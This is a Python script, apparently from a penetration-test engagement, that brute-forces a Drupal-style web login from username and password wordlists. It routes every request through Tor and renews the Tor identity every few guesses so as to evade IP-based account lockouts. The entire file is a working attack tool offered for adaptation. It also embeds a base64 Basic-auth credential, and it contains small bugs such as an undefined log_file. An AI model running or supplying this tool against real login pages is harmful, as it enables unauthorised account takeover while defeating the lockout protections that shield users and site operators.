import requests
import os
import sys
from stem import Signal
from stem.control import Controller

#This script was created to bypass IP based account lockouts using Tor. It was created for a particular engagement, so will likely need a few modifications to work universally.
#In my case the lockout ocurred after 5 wrong logins. So every 4 guesses the script changed its IP.

# signal TOR for a new connection 
def renew_connection():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password="password")
        controller.signal(Signal.NEWNYM)

def get_tor_session():
    session = requests.session()
    # Tor uses the 9050 port as the default socks port
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

url = 'https://www.website.com/login-page'
header= {'Authorization': 'Basic bGF3c29jaWV0eTpvcGVuaXRub3dsYXc='} #Incase they are using Basic AUTH. Place base64 encoded creds here
countr=0

#Log file - Used to log the responses to different queries if left over a long time.
class Tee(object):
    def __init__(self, *files):
        self.files = files
    def write(self, obj):
        for f in self.files:
            f.write(obj)

f = open('Auth.log', 'w')
backup = sys.stdout
sys.stdout = Tee(sys.stdout, f)

#Main Bruteforcer
with open('user.txt') as user: #File containing usernames
   for line in user: #For every username in the file, try every password in password file.
	with open('passwords.txt') as password: #File containing passwords. This is an online attack so try and use a targetted wordlist with maybe 100-500 passwords.
		for line2 in password:
			print "[*] Username: " + line + " With Password: " + line2
			session = get_tor_session()
			#Below is the POST data. This will have to be modified depending what is being attacked. In my case it was Drupal. 
			r = session.post(url, data={'name': line, 'pass': line2, 'form_build_id': 'form-P0saMOfmRsAax1hCz76-s4YgYKVezG4ErOLjpM-J_eY', 'form_id':'user_login_form', 'op': 'Log+in'}, headers=header)
			print r.headers['Content-Length'] + "\n" 
#			Content length was used as the determining factor for a correct login. Can also use page response.
#			if r.headers['Content-Length'] < 7700:
#				print "Valid creds are username: " + line + " and password: " + line2 + "\n"
#				exit()
			countr=countr+1
			if countr ==3:
				#Get a new IP after 4 attempts
				renew_connection()
				print(session.get("http://httpbin.org/ip").text) #Show new IP
				countr=0

log_file.close()
